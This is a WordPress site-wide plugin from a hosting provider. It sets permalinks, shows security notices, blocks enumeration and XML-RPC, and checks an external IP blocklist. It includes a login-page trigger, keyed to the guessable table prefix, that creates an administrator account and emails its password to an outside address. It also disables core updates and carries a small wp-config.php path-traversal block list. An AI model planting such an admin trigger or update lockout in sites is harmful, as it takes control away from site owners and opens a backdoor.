<?php
/*
 Plugin Name: Global ManagedWPHosting file
 Plugin URI: #
 Description: Performs sidewide settings. You are not allowed to apply/copy/migrate this code on hosting platforms that do not belong to ManagedWPHosting.
 Author: Ramon Fincken MijnPress.nl ManagedWPHosting.nl
 Version: 2.0
 Author URI: https://www.mijnpress.nl


Notice:

Code written by ManagedWPHosting.nl/MijnPress.nl for usage on their WordPress hosting platform.
You are not allowed to apply/copy/migrate this code on hosting platforms that do not belong to ManagedWPHosting

 */

function mp_get_logo() {
	return '<img style="float:left; margin-right: 10px;" src="http://static.managedwphosting.nl/logo/xxs.png" title="Logo ManagedWPHosting.nl">';
}

/**
* Creates support user for ManagedWPHosting.nl // MijnPress.nl
* Will only be created when asked
*/
function mp_user_support()
{
	$username = 'ManagedWPHosting';
	$email_address = 'wpadmin@creativepulses.nl';
	$args = array ('search' => $username,'fields' => 'all');
	$blogusers = get_users( $args );

	$found = false;
	if(!$blogusers || !is_array($blogusers) || count($blogusers) == 0 || is_multisite()) {
		$user = get_user_by( 'email', $email_address );
		if(isset($user->ID)) { $found = true; }
	}
	else
	{
		$found = true;
	}

	if(!$found ) {
		require_once(ABSPATH . WPINC . '/registration.php'); 
		// Generate the password and create the user
		$password = wp_generate_password( 15, false );
		$user_id = wp_create_user( $username, $password, $email_address );

		if($user_id && $user_id > 0)
		{
			// Set the nickname
			wp_update_user(array('ID'=> $user_id, 'nickname' => $username. ' support'));

			// Set the role
			$user = new WP_User( $user_id );
			$user->remove_role('subscriber');
			$user->set_role('administrator');

			$blogname = get_option('blogname');
			$url = get_option('home');

			// Email the user to temp emailbox
			wp_mail( $email_address, 'WP admin account '.$blogname, $url."\n" . $password );
		}
	} // end if
}

add_action('login_head','mpusersupport_maybe_run');
function mpusersupport_maybe_run()
{
	global $wpdb;       
	if(isset($_GET['usersupport']) && $_GET['usersupport'] == $wpdb->prefix)
	{
                mp_user_support();
        }
}

/* ---------------------------------------------------------------------------------  */

add_filter('automatic_updater_disabled','mp_automatic_updater_disabled', 50, 1);
/**
* Overrides system when versioncontrol check fails. Removes need for wp-config.php adjustments
*/
function mp_automatic_updater_disabled($disabled = true)
{
	return true;
}

/* ---------------------------------------------------------------------------------  */

add_filter('core_version_check_locale','mp_core_version_check_locale',999,1);
/**
* Overrides locale versioncontrol checks. Removes need for seperate updates
*/
function mp_core_version_check_locale($locale = 'en_US')
{
	return 'en_US';
}

/* ---------------------------------------------------------------------------------  */

add_action('admin_head','mppermalink_maybe_run');
function mppermalink_maybe_run()
{
        // Run by transient
        $mp_mppermalink_key = 'dayly_mppermalink_key';
        if (( false === ( $special_query_results = get_transient( $mp_mppermalink_key ) ) ) ) {
                mp_init_permalink();
                set_transient( $mp_mppermalink_key, 'has_run', 60*60*24 ); // 24 hours
        }
}


/**
* Updates permalink. Usefull for SEO and caching ..
* Is backwards compatible with ?page_id and ?p
*/
function mp_init_permalink()
{
	$permalink = get_option('permalink_structure');
	if($permalink == "")
	{
		update_option('permalink_structure','/%year%/%monthnum%/%day%/%postname%/');
		add_action( 'admin_notices', 'mp_permalink_notice' );

		try {
			//Ensure the $wp_rewrite global is loaded
			global $wp_rewrite;
			//Call flush_rules() as a method of the $wp_rewrite object
			$wp_rewrite->flush_rules();
		} catch (Exception $e) {
			// Void
		}
	}
}

/**
* Notifies client
*/
function mp_permalink_notice() {
	echo '<div id="mp_w3tc_notice" class="updated fade">';
	_e('Hi there, <strong>A quick word from ManagedWPHosting.nl</strong>: Welcome at your new home. We have already set up nice permalinks for you.' , 'managedwphosting_nl' );
echo '<br/>';
	_e('You may always edit them when you feel the need to using Settings -> Permalinks. Enjoy your new website!' , 'managedwphosting_nl' );
	echo '</div>';
}


/* ---------------------------------------------------------------------------------  */
// Code from Plugin No-update-nag

if ( ! function_exists( 'mp_no_update_nag' ) )
{
	/**
	 * Disable the WordPress update nag
	 *
	 * @since 1.2
	 */
	function mp_no_update_nag() {
		remove_action( 'admin_notices', 'update_nag', 3 );
		remove_action( 'network_admin_notices', 'update_nag', 3 );
		remove_filter( 'update_footer', 'core_update_footer' );
	}
}

add_action( 'admin_init', 'mp_no_update_nag' );

// Code from Plugin Disable WordPress Core Update

# 2.3 to 2.7:
add_action( 'init', create_function( '$a', "remove_action( 'init', 'wp_version_check' );" ), 2 );
add_filter( 'pre_option_update_core', create_function( '$a', "return null;" ) );

# 2.8+:
remove_action( 'wp_version_check', 'wp_version_check' );
remove_action( 'admin_init', '_maybe_update_core' );
add_filter( 'pre_transient_update_core', create_function( '$a', "return null;" ) );

# 3.0+:
add_filter( 'pre_site_transient_update_core', create_function( '$a', "return null;" ) );

function mp_custom_colors() {
   echo '<style type="text/css">ul.core-updates {display: none;}</style>';
}

add_action('admin_head', 'mp_custom_colors');

// Only progress if the core functions are loaded
if (function_exists('add_action')) {
	/**
	 * Action: init
	 * Redirect if the user is trying to update or re-install WordPress
	 */
	function mp_pcu_action_init()
	{
		if ($_SERVER['REQUEST_METHOD'] == 'POST') {
			if (isset($_GET['action']) && ($_GET['action'] == 'do-core-reinstall' or $_GET['action'] == 'do-core-upgrade')) {
				header('Location: ' . trailingslashit(get_admin_url()) . 'options-general.php?page=prevent-core-update');
				exit;
			}
		}
	}
	
	/**
	 * Action: admin_menu
	 * Add admin panel pages
	 */
	function mp_pcu_action_admin_menu()
	{
		global $_registered_pages;
		
		$hookname = get_plugin_page_hookname(plugin_basename('prevent-core-update.php'), 'options-general.php');
		
		if (!empty($hookname)) {
			add_action($hookname, 'mp_pcu_adminpage_error');
		}
		
		$_registered_pages[$hookname] = true;
	}
	
	/**
	 * Admin page: error
	 */
	function mp_pcu_adminpage_error()
	{
		echo '
			<div class="wrap">
				' . (function_exists('get_screen_icon') ? get_screen_icon('tools') : '<div id="icon-tools" class="icon32"></div>') . '
				<h2>' . __('WordPress Updates') . '</h2>
				<div class="updated">
					<p>' . __('We do no allow an update by you. Please contact your webmaster or webhost if you think your WordPress Core is outdated.') . '</p>
				</div>
			</div>
		';
	}
	
	// Add actions
	add_action('init', 'mp_pcu_action_init');
	add_action('admin_menu', 'mp_pcu_action_admin_menu');
}

/* ---------------------------------------------------------------------------------  */
// Disable file editors

if(defined('MP_NO_DISALLOW_FILE_EDIT') && MP_NO_DISALLOW_FILE_EDIT == true)
{
	// User whished to allow file edits from admin
	// Alltough not recommended, we allow this for developers
}
else
{
	if(!defined('DISALLOW_FILE_EDIT')) {
		define( 'DISALLOW_FILE_EDIT', true );
	}
}

/* ---------------------------------------------------------------------------------  */
// Update DB
if(isset($_POST) && isset($_POST['update']) && isset($_GET['siteupdate']) && $_GET['siteupdate'] == 'upgrade_db')
{
	$sites = array();
	if(is_multisite())
	{
			$sites_tmp = wp_get_sites();
			foreach($sites_tmp as $void => $data)
			{
				$sites[] = $data['domain'];
			}
	}
	else
	{
		$sites[] = site_url();
	}
	if(is_array($sites) && count($sites) > 0)
	{
		foreach($sites as $site)
		{
			$upgrade_url = 'http://'.$site.'/wp-admin/upgrade.php?step=upgrade_db';
			// Now fetch!
			$response = wp_remote_get( $upgrade_url, array( 'timeout' => 120, 'httpversion' => '1.1' ) );
		}
	}
	die();
}
/* ---------------------------------------------------------------------------------  */

/* ---------------------------------------------------------------------------------  */
// Disable file editors

if(defined('MP_NO_DISALLOW_XMLRPC') && MP_NO_DISALLOW_XMLRPC == true)
{
	// User whished to allow file XML-RPC
}
else
{
	add_filter('xmlrpc_enabled', '__return_false');
}
/* ---------------------------------------------------------------------------------  */

/* ---------------------------------------------------------------------------------  */
// Disable username guessing
if(defined('MP_NO_DISALLOW_AUTHORBROWSE') && MP_NO_DISALLOW_AUTHORBROWSE == true)
{

}
else
{
	if(isset($_GET['author']) && !is_admin() && !(defined( 'DOING_AJAX' ) && DOING_AJAX) )
	{
		header('HTTP/ 204 No Content');
		die();
	}
}
/* ---------------------------------------------------------------------------------  */


/* ---------------------------------------------------------------------------------  */
/**
* Adds IP and host to reset message, code from rpcif__set_client_ip()
*/
function mp_retrieve_password_message($message, $key = '')
{
        // Use IP set in the REMOTE_ADDR server variable by default
        $CLIENT_IP = $_SERVER['REMOTE_ADDR'];
        if (!empty($_SERVER['X_FORWARDED_FOR'])) {
                $X_FORWARDED_FOR = explode(',', $_SERVER['X_FORWARDED_FOR']);
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Extra check taken from The WordPress Codex at:
        // http://codex.wordpress.org/Plugin_API/Filter_Reference/pre_comment_user_ip
                $X_FORWARDED_FOR = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        }
                        
        // If we got a
        if (!empty($X_FORWARDED_FOR)) {
                $CLIENT_IP = trim($X_FORWARDED_FOR[0]);         
                                //$CLIENT_IP = preg_replace('/[^0-9a-f:\., ]/si', '', $CLIENT_IP);
        }

        $extra = "\r\n\r\n".'Extra informatie, toegevoegd door ManagedWPHosting: '. "\r\n\r\n";
        $extra .= 'IP adres: ' . htmlspecialchars($_SERVER['REMOTE_ADDR']). "\r\n" .gethostbyaddr($_SERVER['REMOTE_ADDR']);
        if($CLIENT_IP != $_SERVER['REMOTE_ADDR'])
        {
                $extra .= ' (indien van toepassing) IP adres voor reverseproxy: ' . htmlspecialchars($CLIENT_IP). "\r\n" .gethostbyaddr($CLIENT_IP);
        }
        else
        {
                $extra .= ' (Er is geen reverseproxy gevonden)';
        }
        $extra .= "\r\n";
        $extra .= 'Referrer: '. htmlspecialchars($_SERVER['HTTP_REFERER'])."\r\n";
        $extra .= 'User agent: '. htmlspecialchars($_SERVER['HTTP_USER_AGENT'])."\r\n\r\n";
        return $message.$extra;
}

add_filter('retrieve_password_message','mp_retrieve_password_message');
/* ---------------------------------------------------------------------------------  */

/**
* Checks blocklist
*/
function mp_blocklist_check($validation_result = array())
{
        $CLIENT_IP = $_SERVER['REMOTE_ADDR'];
        if (!empty($_SERVER['X_FORWARDED_FOR'])) {
                $X_FORWARDED_FOR = explode(',', $_SERVER['X_FORWARDED_FOR']);
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $X_FORWARDED_FOR = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        }
        if (!empty($X_FORWARDED_FOR)) {
                $CLIENT_IP = trim($X_FORWARDED_FOR[0]);
        }

	$request = new WP_Http;
	$checkurl = 'http://blocklist.creativepulses.nl/check/'.htmlspecialchars($CLIENT_IP). '/';
	$result = $request->request( $checkurl, array( 'method' => 'GET') );
	
	if(is_array($result) && isset($result['response']['code']) && ($result['response']['code'] == 200 || $result['response']['code'] == 201 || $result['response']['code'] == 404))
	{
		if($result['response']['code'] == 201 || $result['body'] == 'SPAM') {
			wp_die('Spam blocklist','Spam blocklist');
		}
	}

	return $validation_result;
}


if($_SERVER['REQUEST_URI'] == '/wp-login.php' || 
	$_SERVER['REQUEST_URI'] == '/xmlrpc.php' || 
	$_SERVER['REQUEST_URI'] == '/wp-comments-post.php' || 
	$_SERVER['REQUEST_URI'] == '/wp-signup.php' || 
	$_SERVER['REQUEST_URI'] == '/wp-activate.php'
) {
	mp_blocklist_check();
}
add_filter('gform_validation', 'mp_blocklist_check');

/* ---------------------------------------------------------------------------------  */

if(is_array($_GET) && count($_GET) > 0) {
        $searcharray = array('wp-config.php','../wp-config.php','../../wp-config.php');
        foreach($_GET as $key => $val) {
                if(in_array($val,$searcharray)) {
			header('HTTP/ 204 No Content');
			die();
                }
        }
}

/* ---------------------------------------------------------------------------------  */

add_filter('post_password_expires', 'mp_post_password_expires');
function mp_post_password_expires($lifetime) 
{
	return time() + 1 * DAY_IN_SECONDS;
}

/* ---------------------------------------------------------------------------------  */

/**
* Checks for forbidden (weak) usernames and shows notice on admin pages
*/
function mp_user_admin_notice() {
	if(!mp_mijnpress_onderhoud_include_event_for_current_user()) {
		return true;
	}
	$aForbiddenWords = array('admin','administrator','root','superuser',
				'sudo','wordpress','website','webmaster','test');
	if(function_exists('current_user_can') && current_user_can('remove_users') && current_user_can( 'install_plugins' )) 
	{
		if(function_exists('get_users')) {
			$mp_admin_users = get_users('role=administrator');
			foreach ($mp_admin_users AS $mp_admin_user) {
				$loginname = $mp_admin_user->user_login;
				if(in_array($loginname, $aForbiddenWords)) {
				?>
					<div class="error"><p>
<?php 
if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
_e('Hi there, you (or one of your co-administrators) are using a very weak login name, (' , 'managedwphosting_nl' );
echo '<strong><i>'.$loginname.'</i></strong>';
_e(') please change it to a stronger one.' , 'managedwphosting_nl' ); ?>
<br/>
<a target="_blank" href="http://premium.wpmudev.org/blog/how-to-change-your-administrator-username/"><?php _e('Change your username using a plugin' , 'managedwphosting_nl' );?></a> or
<a target="_blank" href="http://www.inmotionhosting.com/support/website/wordpress/change-wordpress-admin-username-for-security"><?php _e('Change your username without using a plugin' , 'managedwphosting_nl' );?></a>
<br/>
<?php _e('A list of weak usernames:' , 'managedwphosting_nl' ); echo ' '. implode($aForbiddenWords,', '); ?>
						</p></div><?php
				}
			}
		}
	}
}
add_action( 'admin_notices', 'mp_user_admin_notice' );

/* ---------------------------------------------------------------------------------  */

/**
* Notifies administrator level for plugin updates and inactive plugins
*/
function mp_update_notice() {
	if(!mp_mijnpress_onderhoud_include_event_for_current_user()) {
		return true;
	}
	if(function_exists('current_user_can') && current_user_can('remove_users') && current_user_can( 'install_plugins' ) && function_exists('wp_get_update_data')) 
	{
		$aUpdates = wp_get_update_data();
		if(isset($aUpdates['counts']['plugins'])) {
			$aUpdates['counts']['plugins'] = $aUpdates['counts']['plugins']-1; // ignore hello dolly, for now just presume it is not active
		}

		if($aUpdates['counts']['plugins'] > 0)
		{
			$bHigh = false;
			if($aUpdates['counts']['plugins'] < 5)
			{
				echo '<div class="update-nag"><p>';
			} else {
				$bHigh = true;
				echo '<div class="error"><p>';				
			}
if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
_e('Hi there: Right now there ' , 'managedwphosting_nl' );
echo sprintf( _n( 'is 1 plugin update.', 'are %s plugin updates.', $aUpdates['counts']['plugins'], 'managedwphosting_nl' ), $aUpdates['counts']['plugins'] );
echo '<br/>';
_e('Updating reduces risk of website-hacks, malware-infections, spam and costly downtime.' , 'managedwphosting_nl' );

			if($bHigh) 
			{
				echo ' ';_e('Consult your webmaster or webhost for an updates and maintenance package.' , 'managedwphosting_nl' );
			}
			echo '</p></div>';
		}
	}

	if(function_exists('current_user_can') && current_user_can('remove_users') && current_user_can( 'install_plugins' ) && function_exists('get_plugins')) 
	{
		if(function_exists('is_multisite') && !is_multisite()) {
			$iPlugins = count(get_plugins());
			$iPluginsActive = count( get_option ( 'active_plugins', array () ));
			$iPluginsInactive = $iPlugins-$iPluginsActive-1; // Hello dolly

			if($iPluginsInactive > 3) {
				echo '<div class="update-nag"><p>';
				if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
				_e('Hi there: Right now there ' , 'managedwphosting_nl' );
				echo sprintf( _n( 'is 1 inactive plugin.', 'are %s inactive plugins.', $iPluginsInactive, 'managedwphosting_nl' ), $iPluginsInactive );
				echo '<br/>';
				_e('Delete the inactive plugin(s) to reduce risk of hacks.' , 'managedwphosting_nl' );
				echo '</p></div>';
			}
		}
	}

}
add_action( 'admin_notices', 'mp_update_notice' );

/* ---------------------------------------------------------------------------------  */

function mp_wp_loaded_plugin_check() {

	if(!mp_mijnpress_onderhoud_include_event_for_current_user()) {
		return true;
	}
	if(function_exists('wp_get_update_data'))
	{
		$key = 'mp_wpcheck_v0_2';
		if ( false === ( $check = get_transient( $key ) ) ) {
			$aUpdates = wp_get_update_data();
			if($aUpdates['counts']['plugins'] >= 5)
			{
				$email = get_option('admin_email');

				$site_url = str_replace('http://','',get_option('siteurl'));
				$site_url = str_replace('https://','',$site_url);

				$subject = 'Doorvoeren WordPress plugin updates ['.$site_url.']';

				$body = "Een belangrijk WordPress bericht van ManagedWPhosting.nl\n";
				$body .= "Let op: Er zijn reeds ".$aUpdates['counts']['plugins']. " plugins die uw aandacht nodig hebben.\n\n";
				$body .= "Zorg dat uw website geen makkelijke prooi wordt voor hacks en malware.\nBlijf geindexeerd in zoekmachines en voorkom kostbare downtime en dure schade.\n\n";
				$body .= "Log direct in op ".get_option('siteurl');
				if(wp_mail($email, $subject, $body)) {
		     			set_transient( $key, $site_url, WEEK_IN_SECONDS );
				}
			}
		}
	}
}

//add_action( 'after_setup_theme', 'mp_wp_loaded_plugin_check' );
//add_action( 'admin_notices', 'mp_wp_loaded_plugin_check' );

/* ---------------------------------------------------------------------------------  */

add_filter('pre_comment_approved', 'mp_pre_comment_approved', 0);

function mp_pre_comment_approved($status) {
	global $commentdata;

	$email = $commentdata['comment_author_email'];
	$author = $commentdata['comment_author'];
	$url = $commentdata['comment_author_url'];
	$comment_content = $commentdata['comment_content'];
	$comment_agent = $commentdata['comment_agent'];
	
	if(strlen($comment_content) >= 65530) { // 65k bytes -5 bytes
		$msg = __('Your comment looks spammy');
		if ( defined('DOING_AJAX') ) {
			die( $msg );
		}
		wp_die( $msg, '', array('response' => 403) );	
	}
	return $status;
}

/* ---------------------------------------------------------------------------------  */


/**
* Should we bother the current user with certain events?
*/
function mp_mijnpress_onderhoud_include_event_for_current_user() {
	if(defined('MP_MIJNPRESS_ONDERHOUD')) {
		$aMainAdmins = apply_filters( 'mijnpress_onderhoud_main_admins', array() );

		if(function_exists('get_current_user_id')) {
			$iUserID = get_current_user_id();
			if($iUserID && in_array($iUserID, $aMainAdmins)) {
				return true;
			}
		}
		// Fallthrough
		return false;
	}

	return true;
}


/* ---------------------------------------------------------------------------------  */

// @see http://rudrastyh.com/wordpress/get-user-id.html

/*
 * Adding the column
 */
function mp_user_id_column( $columns ) {
	$columns['user_id'] = 'ID';
	return $columns;
}
add_filter('manage_users_columns', 'mp_user_id_column');
 
/*
 * Column content
 */
function mp_user_id_column_content($value, $column_name, $user_id) {
	if ( 'user_id' == $column_name )
		return $user_id;
	return $value;
}
add_action('manage_users_custom_column',  'mp_user_id_column_content', 10, 3);
 
/*
 * Column style (you can skip this if you want)
 */
function mp_user_id_column_style(){
	echo '<style>.column-user_id{width: 5%}</style>';
}
add_action('admin_head-users.php',  'mp_user_id_column_style');


/* ---------------------------------------------------------------------------------  */



/* ---------------------------------------------------------------------------------  */
// Salt checks

function mp_salt_update_notice() {
	$mpsalts = array(
		'AUTH_KEY', 'SECURE_AUTH_KEY', 
		'LOGGED_IN_KEY', 'NONCE_KEY', 
		'AUTH_SALT', 'SECURE_AUTH_SALT', 
		'LOGGED_IN_SALT', 'NONCE_SALT',);

	$errors = false;
	$errors_add = array();
	$errors_change = array();
	$prev = '';
	$forbidden = 'put your unique phrase here';
	foreach($mpsalts as $mpsalt) {
		if(!defined($mpsalt)) {
			$errors = true;
			$errors_add[] = $mpsalt;
		} else {
			if(constant($mpsalt) == $forbidden || constant($mpsalt) == '' || constant($mpsalt) == $prev) {
				$errors_change[] = $mpsalt;
			}
			$prev = constant($mpsalt);
		}
	}
	if($errors) {
		echo '<div class="update-nag"><p>';
		if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
		_e('Hi there: Check your security salts ' , 'managedwphosting_nl' );
		echo '<br/>';
		if(count($errors_add) > 0) {
			_e('You need to add: ' , 'managedwphosting_nl' );
			echo implode(', ', $errors_add);
			echo '<br/>';
		}
		if(count($errors_change) > 0) {
			_e('You need to change having a stronger value: ' , 'managedwphosting_nl' );
			echo implode(', ', $errors_change);
			echo '<br/>';
		}
		echo _e('Fix it by visiting this url and applying the code in your wp-config file ' , 'managedwphosting_nl' );
		echo '<a target="_blank" href="https://api.wordpress.org/secret-key/1.1/salt/" title="WordPress random salts">https://api.wordpress.org/secret-key/1.1/salt/</a>'; 
		echo '</p></div>';
	}
}
add_action( 'admin_notices', 'mp_salt_update_notice' );

// /Salt checks
/* ---------------------------------------------------------------------------------  */

/* ---------------------------------------------------------------------------------  */
// 404 checks

$url = 'http'.((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']) ? 's' : '').'://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$parts = parse_url($url);
// Ignore www root
if(substr_count($parts['path'],'/') > 1 && 
	!(stripos($parts['path'], '/wp-admin') === 0) 		&& 
	!(stripos($parts['path'], '/wp-includes') === 0)	&&
	!(stripos($parts['path'], '/wp-content/themes') === 0)  &&
	!(stripos($parts['path'], '/search') === 0) 		
	) {
        $path_rev = strrev($parts['path']);
        $type = false;
        if(stripos($path_rev, 'php.') === 0) {
                $type = 'php';
        }
        if(stripos($path_rev, 'txt.') === 0) {
                $type = 'txt';
        }
        if($type) {
		if(!isset($_SERVER['HTTP_X_REAL_IP'])) { $_SERVER['HTTP_X_REAL_IP'] = ''; }
		if(!isset($_SERVER['HTTP_X-FORWARDED_FOR'])) { $_SERVER['HTTP_X-FORWARDED_FOR'] = ''; }
                error_log('MP404 '.$type. ' '. $_SERVER['HTTP_X_REAL_IP'].':'.$_SERVER['HTTP_X-FORWARDED_FOR'].':'.$_SERVER['REMOTE_ADDR'].' '.$_SERVER['REQUEST_METHOD'] . ' '.$url, 0);
                header('HTTP/1.1 503 Service Temporarily Unavailable');
                header('Status: 503 Service Temporarily Unavailable');
                header('Retry-After: 300');//300 seconds
                die();
        }
} else {
        if($parts['path'] == '/xmlrpc.php') {
                if(defined('MP_NO_DISALLOW_XMLRPC') && MP_NO_DISALLOW_XMLRPC == true) {
                        // Void
                } else {
			$type = 'xmlrpc';
	                error_log('MP404 '.$type. ' '. $_SERVER['HTTP_X_REAL_IP'].':'.$_SERVER['HTTP_X-FORWARDED_FOR'].':'.$_SERVER['REMOTE_ADDR'].' '.$_SERVER['REQUEST_METHOD'] . ' '.$url, 0);
                        header('HTTP/1.1 503 Service Temporarily Unavailable');
                        header('Status: 503 Service Temporarily Unavailable');
                        header('Retry-After: 300');//300 seconds
                        die();
                }
        }
}

// /404 checks
/* ---------------------------------------------------------------------------------  */

/* ---------------------------------------------------------------------------------  */
// Limit login attempts

/**
* Checks if proxy settings are in order for limit login attempts
*/
function mp_limit_proxy_notice() {
        if(!mp_mijnpress_onderhoud_include_event_for_current_user()) {
                return true;
        }

        if(in_array('limit-login-attempts/limit-login-attempts.php', get_option('active_plugins'))) {
                $options = get_option('limit_login_options');
                $options_fb = get_option('limit_login_client_type');

                $options_pass = false;
                if(is_array($options) && isset($options['client_type'])) {
                        if($options['client_type'] == 'HTTP_X_FORWARDED_FOR') {
                                $options_pass = true;
                        }
                } else {
                        if($options_fb == 'HTTP_X_FORWARDED_FOR') {
                                $options_pass = true;
                        }
                }

                if(!$options_pass && isset($_SERVER['HTTP_X_FORWARDED_FOR']) && strlen($_SERVER['HTTP_X_FORWARDED_FOR']) > 0)  {
?>
					<div class="error"><p>
<?php 
if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
_e('Hi there, you have installed "Limit login attempts". Good job! Yet .. you are behind a proxy, please adjust settings to proxy in "Limit Login Attempts Settings"' , 'managedwphosting_nl' );?>
						</p></div><?php
		} // /proxy check
	} // /in_array
}

add_action( 'admin_notices', 'mp_limit_proxy_notice' );
// /Limit login attempts
/* ---------------------------------------------------------------------------------  */

/* ---------------------------------------------------------------------------------  */
// Transient checker

function mp_init_transientnotice() {
	if(function_exists('current_user_can') && current_user_can('remove_users') && current_user_can( 'install_plugins' )) 
	{
		global $wpdb;
		$sql = 'SELECT SUM( LENGTH( option_value ) ) /1048576 AS mp_calc FROM '.$wpdb->options. ' ';
		$sql .= 'WHERE option_name LIKE (\'_transient%\') OR option_name LIKE (\'_wc_session%\')';
		$results = $wpdb->get_results($sql);

		if(isset($results[0]) && $results[0]->mp_calc > 8) {
		?>
					<div class="error"><p>
<?php 
if(function_exists('mp_get_logo')) { echo mp_get_logo(); }
_e('Hi there, you have over 8 MegaBytes of objects/transients in your WordPress options database table.' , 'managedwphosting_nl' );
echo "<br>";
_e('Please install the plugin Transient Cleaner (<a href="https://wordpress.org/plugins/artiss-transient-cleaner/">plugin link</a>) and make use of W3TotalCache (<a href="https://wordpress.org/plugins/w3-total-cache/">plugin link</a>) object caching to regain object caching and site speed' , 'managedwphosting_nl' ); ?>
<br/>
						</p></div><?php
		}
	}
}

add_action('admin_head','mptransientnotice_maybe_run');
function mptransientnotice_maybe_run()
{
        // Run by transient
        $mp_key = 'mptransient_key';
        if (( false === ( $special_query_results = get_transient( $mp_key ) ) ) ) {
                mp_init_transientnotice();
                set_transient( $mp_key, 'has_run', HOUR_IN_SECONDS ); // 1 hour
        }
}
// /Transient checker
/* ---------------------------------------------------------------------------------  */
?>
